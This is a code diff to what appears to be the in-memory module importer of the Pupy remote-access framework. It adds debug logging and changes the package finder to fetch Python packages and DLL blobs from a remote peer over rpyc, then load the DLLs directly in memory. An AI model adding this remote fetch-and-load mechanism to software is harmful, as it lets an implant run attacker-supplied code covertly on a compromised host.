@@ -20,14 +20,20 @@ import sys, imp, marshal, gc
 
 __debug = False
 __trace = False
+__dprint_method = None
 
 modules = {}
 dlls = set()
 
 def dprint(msg):
     global __debug
-    if __debug:
-        print msg
+    global __dprint_method
+
+    if __dprint_method is None:
+        if __debug:
+            print msg
+    else:
+        __dprint_method(msg)
 
 def loadpy(src, dst, masked=False):
     content = src
@@ -295,7 +301,11 @@ def invalidate_module(name):
 
     gc.collect()
 
-class PupyPackageLoader:
+class DummyPackageLoader(object):
+    def load_module(self, fullname):
+        return sys.modules[fullname]
+
+class PupyPackageLoader(object):
     def __init__(self, fullname, contents, extension, is_pkg, path):
         self.fullname = fullname
         self.contents = contents
@@ -313,8 +323,7 @@ class PupyPackageLoader:
             if fullname in sys.modules:
                 return sys.modules[fullname]
 
-            mod=None
-            c=None
+            mod = None
             if self.extension=='py':
                 mod = imp.new_module(fullname)
                 mod.__name__ = fullname
@@ -361,7 +370,6 @@ class PupyPackageLoader:
             except Exception, e:
                 dprint('memtrace failed: {}'.format(e))
 
-
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
@@ -370,8 +378,10 @@ class PupyPackageLoader:
 
             if remote_print_error:
                 try:
+                    dprint('Call remote_print_error() - error loading package - start'.format())
                     remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
                         fullname, self.path, self.is_pkg, str(traceback.format_exc())))
+                    dprint('Call remote_print_error() - error loading package - complete'.format())
                 except:
                     pass
             else:
@@ -438,7 +448,23 @@ class PupyPackageFinder(object):
                                 PupyPackageFinder.search_set.add(fullname)
 
                     try:
-                        if remote_load_package(fullname):
+                        dprint('Remote load package {}'.format(fullname))
+                        packages, dlls = remote_load_package(fullname)
+                        dprint('Remote load package {} - success'.format(fullname))
+                        if not packages and not dlls:
+                            dprint('Remote load package {} - not found'.format(fullname))
+                        else:
+                            if dlls:
+                                dlls = pupy.obtain(dlls)
+                                for name, blob in dlls:
+                                    load_dll(name, blob)
+
+                            if packages:
+                                pupy_add_package(packages, True, fullname)
+
+                            if fullname in sys.modules:
+                                return DummyPackageLoader()
+
                             return self.find_module(fullname, second_pass=True)
 
                     except Exception as e:
@@ -533,11 +559,13 @@ def native_import(name):
 
 def register_package_request_hook(hook):
     global remote_load_package
+
     remote_load_package = hook
 
 def register_package_error_hook(hook):
     global remote_print_error
     import rpyc
+
     remote_print_error = rpyc.async(hook)
 
 def unregister_package_error_hook():
@@ -551,6 +579,7 @@ def unregister_package_request_hook():
 def install(debug=None, trace=False):
     global __debug
     global __trace
+    global __dprint_method
     global modules
 
     if debug:
@@ -673,3 +702,7 @@ def install(debug=None, trace=False):
 
     if sys.platform == 'win32':
         import pywintypes
+
+    import logging
+    logger = logging.getLogger('ppi')
+    __dprint_method = logger.debug
